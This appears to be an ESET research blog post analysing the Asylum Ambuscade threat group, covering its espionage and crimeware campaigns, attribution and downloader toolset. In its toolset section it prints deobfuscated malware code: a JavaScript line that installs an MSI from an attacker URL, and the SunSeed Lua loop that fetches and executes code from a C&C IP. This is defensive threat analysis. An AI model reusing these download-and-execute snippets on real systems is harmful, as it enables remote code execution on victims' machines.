    <h1 class="page-headline">Asylum Ambuscade: crimeware or cyberespionage?</h1>    <p class="sub-title">A curious case of a threat actor at the border between crimeware and cyberespionage</p>
    
    <div class="article-authors d-flex flex-wrap"><div class="article-author d-flex"><a href="/en/our-experts/matthieu-faou/" title="Matthieu Faou"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x45/wls/mfaou.jpeg" media="(max-width: 768px)" /><img class="author-image me-3"  src="https://web-assets.esetstatic.com/tn/-x45/wls/mfaou.jpeg" alt="Matthieu Faou"  /></picture></a><div class="author-text"><p><a href="/en/our-experts/matthieu-faou/" title="Matthieu Faou"><b>Matthieu Faou</b></a></p></div></div></div>

        <span class="d-none d-lg-inline">&nbsp;&bull;&nbsp;</span>
        <span class="d-inline d-lg-none">, </span>
        <span>19 min. read</span>
    </p>

    <div class="hero-image-container">
        <picture><source srcset="https://web-assets.esetstatic.com/tn/-x266/wls/2023/06/asylum-ambuscade-cyberespionage-crimeware.jpg" media="(max-width: 768px)" /><source srcset="https://web-assets.esetstatic.com/tn/-x425/wls/2023/06/asylum-ambuscade-cyberespionage-crimeware.jpg" media="(max-width: 1120px)" /><img class="hero-image"  src="https://web-assets.esetstatic.com/tn/-x700/wls/2023/06/asylum-ambuscade-cyberespionage-crimeware.jpg" alt="Asylum Ambuscade: crimeware or cyberespionage?"  /></picture>    </div>

                    <div class="article-body">
    <p>Asylum Ambuscade is a cybercrime group that has been performing cyberespionage operations on the side. They were first publicly outed in March 2022 by <a href="https://www.proofpoint.com/us/blog/threat-insight/asylum-ambuscade-state-actor-uses-compromised-private-ukrainian-military-emails" target="_blank" rel="noopener">Proofpoint researchers</a> after the group targeted European government staff involved in helping Ukrainian refugees, just a few weeks after the start of the Russia-Ukraine war. In this blogpost, we provide details about the early 2022 espionage campaign and about multiple cybercrime campaigns in 2022 and 2023.</p>
<span class="update-block"><p><br />
<em><strong>Key points of this blogpost:</strong></em>
<ul>
<li><em>Asylum Ambuscade has been operating since at least 2020.</em></li>
<li><em>It is a crimeware group that targets bank customers and cryptocurrency traders in various regions, including North America and Europe.</em></li>
<li><em>Asylum Ambuscade also does espionage against government entities in Europe and Central Asia.</em></li>
<li><em>Most of the group’s implants are developed in script languages such as AutoHotkey, JavaScript, Lua, Python, and VBS.</em></li>
</ul>
<br /></p></span><h2>Cyberespionage campaigns</h2>
<p>Asylum Ambuscade has been running cyberespionage campaigns since at least 2020. We found previous compromises of government officials and employees of state-owned companies in Central Asia countries and Armenia.</p>
<p>In 2022, and as highlighted in the Proofpoint publication, the group targeted government officials in several European countries bordering Ukraine. We assess that the goal of the attackers was to steal confidential information and webmail credentials from official government webmail portals.</p>
<p>The compromise chain starts with a spearphishing email that has a malicious Excel spreadsheet attachment. Malicious VBA code therein downloads an MSI package from a remote server and installs SunSeed, a downloader written in Lua.</p>
<p>Note that we observed some variations in the attachments. In June 2022, the group used an exploit of the Follina vulnerability (<a href="https://nvd.nist.gov/vuln/detail/cve-2022-30190" target="_blank" rel="noopener">CVE-2022-30190</a>) instead of malicious VBA code. This document is shown in Figure 1. It is written in Ukrainian and the decoy is about a security alert regarding a <a href="https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/" target="_blank" rel="noopener">Gamaredon</a> (another well-known espionage group) attack in Ukraine.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-1.-Document-leveraging-the-Follina-vulnerability.png"><img class="wp-image-174452 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-1.-Document-leveraging-the-Follina-vulnerability.png" alt="" width="855" height="1013" /></a><p class="caption-text"><em>Figure 1. Document leveraging the Follina vulnerability</em></p></div></p>
<p>Then, if the machine is deemed interesting, the attackers deploy the next stage: AHKBOT. This is a downloader written in AutoHotkey that can be extended with plugins, also written in AutoHotkey, in order to spy on the victim’s machine. An analysis of the group’s toolset is provided later in the blogpost.</p>
<h2>Cybercrime campaigns</h2>
<p>Even though the group came into the spotlight because of its cyberespionage operations, it has been mostly running cybercrime campaigns since early 2020.</p>
<p>Since January 2022, we have counted more than 4,500 victims worldwide. While most of them are located in North America, as shown in Figure 2, it should be noted that we have also seen victims in Asia, Africa, Europe, and South America.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-2.-Geographical-distribution-of-victims-since-January-2022.png"><img class="wp-image-174440 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-2.-Geographical-distribution-of-victims-since-January-2022.png" alt="" width="1437" height="777" /></a><p class="caption-text"><em>Figure 2. Geographical distribution of victims since January 2022</em></p></div></p>
<p>The targeting is very wide and mostly includes individuals, cryptocurrency traders, and small and medium businesses (SMBs) in various verticals.</p>
<p>While the goal of targeting cryptocurrency traders is quite obvious – stealing cryptocurrency – we don’t know for sure how Asylum Ambuscade monetizes its access to SMBs. It is possible the group sells the access to other crimeware groups who might, for example, deploy ransomware. We have not observed this in our telemetry, though.</p>
<p>Asylum Ambuscade’s crimeware compromise chain is, overall, very similar to the one we describe for the cyberespionage campaigns. The main difference is the compromise vector, which can be:</p>
<ul>
<li>A malicious Google Ad redirecting to a website delivering a malicious JavaScript file (as highlighted in this <a href="https://isc.sans.edu/diary/Google%20ad%20traffic%20leads%20to%20stealer%20packages%20based%20on%20free%20software/29376" target="_blank" rel="noopener">SANS blogpost</a>)</li>
<li>Multiple HTTP redirections in a Traffic Direction System (TDS). The TDS used by the group is referred to as 404 TDS by <a href="https://www.proofpoint.com/us/blog/threat-insight/screentime-sometimes-it-feels-like-somebodys-watching-me" target="_blank" rel="noopener">Proofpoint</a>. It is not exclusive to Asylum Ambuscade and we observed it was, for example, used by another threat actor to deliver Qbot. An example of a redirection chain, captured by <a href="https://urlscan.io/result/d1c0abf7-b2d5-44db-8199-cd7dcdb9eb11/#transactions">io</a>, is shown in Figure 3.</li>
</ul>

<h2>Attribution</h2>
<p>We believe that the cyberespionage and cybercrime campaigns are operated by the same group.</p>
<ul>
<li>The compromise chains are almost identical in all campaigns. In particular, SunSeed and AHKBOT have been widely used for both cybercrime and cyberespionage.</li>
<li>We don’t believe that SunSeed and AHKBOT are sold on the underground market. These tools are not very sophisticated in comparison to other crimeware tools for sale, the number of victims is quite low were it a toolset shared among multiple groups, and the network infrastructure is consistent across campaigns.</li>
</ul>
<p>As such, we believe that Asylum Ambuscade is a cybercrime group that is doing some cyberespionage on the side.</p>
<p>We also believe that these three articles describe incidents related to the group:</p>
<ul>
<li>A TrendMicro article from 2020: <a href="https://www.trendmicro.com/en_us/research/20/l/stealth-credential-stealer-targets-us-canadian-bank-customers.html" target="_blank" rel="noopener">Credential Stealer Targets US, Canadian Bank Customers</a></li>
<li>A Proofpoint article from 2022: <a href="https://www.proofpoint.com/us/blog/threat-insight/asylum-ambuscade-state-actor-uses-compromised-private-ukrainian-military-emails" target="_blank" rel="noopener">Asylum Ambuscade: State Actor Uses Lua-based Sunseed Malware to Target European Governments and Refugee Movement</a></li>
<li>A Proofpoint article from 2023: <a href="https://www.proofpoint.com/us/blog/threat-insight/screentime-sometimes-it-feels-like-somebodys-watching-me" target="_blank" rel="noopener">Screentime: Sometimes It Feels Like Somebody's Watching Me</a></li>
</ul>
<h2>Toolset</h2>
<h3>Malicious JavaScript files</h3>
<p>In most crimeware campaigns run by the group, the compromise vector is not a malicious document, but a JavaScript file downloaded from the previously documented TDS. Note that it has to be manually executed by the victim, so the attackers are trying to entice people into clicking on the files by using filenames such as <span style="font-family: 'courier new', courier, monospace;">Document_12_dec-1532825.js</span>, <span style="font-family: 'courier new', courier, monospace;">TeamViewer_Setup.js</span>, or <span style="font-family: 'courier new', courier, monospace;">AnyDeskInstall.js</span>.</p>
<p>Those scripts are obfuscated using random variable names and junk code, most likely intended to bypass detections. An example is provided in Figure 5.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-5.-Obfuscated-JavaScript-downloader-1.png"><img class="wp-image-174460 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-5.-Obfuscated-JavaScript-downloader-1.png" alt="" width="2774" height="1944" /></a><p class="caption-text"><em>Figure 5. Obfuscated JavaScript downloader</em></p></div></p>
<p>Once deobfuscated, this script can be summarized in two lines:</p>
<pre class="language-bash" title=""><code>var obj = new ActiveXObject("windowsinstaller.installer");
obj.InstallProduct("https://namesilo.my[.]id/css/ke.msi");</code></pre>
<h3>First-stage downloaders</h3>
<p>The first stage downloaders are dropped by an MSI package downloaded by either a malicious document or a JavaScript file. There are three versions of this downloader:</p>
<ul>
<li>Lua (SunSeed)</li>
<li>Tcl</li>
<li>VBS</li>
</ul>
<p>SunSeed is a downloader written in the Lua language and heavily obfuscated, as shown in Figure 6.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-6.-The-SunSeed-Lua-variant-is-heavily-obfuscated.png"><img class="wp-image-174444 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-6.-The-SunSeed-Lua-variant-is-heavily-obfuscated.png" alt="" width="1365" height="324" /></a><p class="caption-text"><em>Figure 6. The SunSeed Lua variant is heavily obfuscated</em></p></div></p>
<p>Once manually deobfuscated, the main function of the script looks like this:</p>
<pre class="language-bash" title=""><code>require('socket.http')
serial_number = Drive.Item('C').SerialNumber
server_response = socket.request(http://84.32.188[.]96/ + serial_number)
pcall(loadstring(server_response))
collectgarbage()
&lt;jump to the start and retry&gt;</code></pre>
<p>&nbsp;</p>
<p>It gets the serial number of the C: drive and sends a GET request to <span style="font-family: 'courier new', courier, monospace;">http://&lt;C&amp;C&gt;/&lt;serial_number&gt;</span> using the User-Agent <span style="font-family: 'courier new', courier, monospace;">LuaSocket 2.0.2</span>. It then tries to execute the reply. This means that SunSeed expects to receive additional Lua scripts from the C&amp;C server. We found two of those scripts: <span style="font-family: 'courier new', courier, monospace;">install</span> and <span style="font-family: 'courier new', courier, monospace;">move</span>.</p>
<p><span style="font-family: 'courier new', courier, monospace;">install</span> is a simple Lua script that downloads an AutoHotkey script into <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\mscoree.ahk</span> and the legitimate AutoHotkey interpreter into <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\mscoree.exe</span>, as shown in Figure 7. This AutoHotkey script is AHKBOT, the second stage downloader.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-7.-Lua-script-that-downloads-an-AutoHotkey-script.png"><img class="wp-image-174445 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-7.-Lua-script-that-downloads-an-AutoHotkey-script.png" alt="" width="1072" height="228" /></a><p class="caption-text"><em>Figure 7. Lua script that downloads an AutoHotkey script</em></p></div></p>
<p>An even simpler Lua script, <span style="font-family: 'courier new', courier, monospace;">move</span>, is shown in Figure 8. It is used to reassign management of a victimized computer from one C&amp;C server to another. It is not possible to update the hardcoded SunSeed C&amp;C server; to complete a C&amp;C reassignment, a new MSI installer needs to be downloaded and executed, exactly as when the machine was first compromised.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-8.-Lua-script-to-move-management-of-a-compromised-machine-from-one-CC-server-to-another.png"><img class="wp-image-174446" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-8.-Lua-script-to-move-management-of-a-compromised-machine-from-one-CC-server-to-another.png" alt="" width="740" height="101" /></a><p class="caption-text"><em>Figure 8. Lua script to move management of a compromised machine from one C&amp;C server to another</em></p></div></p>
<p>As mentioned above, we found another variant of SunSeed developed using the Tcl language instead of Lua, as shown in Figure 9. The main difference is that it doesn’t send the <span style="font-family: 'courier new', courier, monospace;">C:</span> drive’s serial number in the GET request.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-9.-SunSeed-variant-Tcl.png"><img class="wp-image-174455 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-9.-SunSeed-variant-Tcl.png" alt="" width="1156" height="732" /></a><p class="caption-text"><em>Figure 9. SunSeed variant in Tcl</em></p></div></p>
<p>The third variant was developed in VBS, as shown in Figure 10. The main difference is that it doesn’t download and interpret additional code, but downloads and executes an MSI package.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-10.-SunSeed-variant-in-VBS-1.png"><img class="wp-image-174456 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-10.-SunSeed-variant-in-VBS-1.png" alt="" width="2792" height="405" /></a><p class="caption-text"><em>Figure 10. SunSeed variant in VBS</em></p></div></p>
<h3>Second-stage downloaders</h3>
<p>The main second-stage downloader is AHKBOT, developed in AutoHotkey. As shown in Figure 11, it sends a GET request, with the User-Agent <span style="font-family: 'courier new', courier, monospace;">AutoHotkey</span> (the default value used by AutoHotkey), to <span style="font-family: 'courier new', courier, monospace;">http://&lt;C&amp;C&gt;/&lt;serial_number_of_C_drive&gt;-RP</span>, almost exactly as the earlier SunSeed. <span style="font-family: 'courier new', courier, monospace;">RP</span> might be a campaign identifier, as it changes from sample to sample.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2023/06/Figure-11.-AHKBOT.png"><img class="wp-image-174449 size-full" src="https://web-assets.esetstatic.com/wls/2023/06/Figure-11.-AHKBOT.png" alt="" width="879" height="503" /></a><p class="caption-text"><em>Figure 11. AHKBOT</em></p></div></p>

<h2>Conclusion</h2>
<p>Asylum Ambuscade is a cybercrime group mostly targeting SMBs and individuals in North America and Europe. However, it appears to be branching out, running some recent cyberespionage campaigns on the side, against governments in Central Asia and Europe from time to time.</p>
<p>It is quite unusual to catch a cybercrime group running dedicated cyberespionage operations, and as such we believe that researchers should keep close track of Asylum Ambuscade activities.</p>
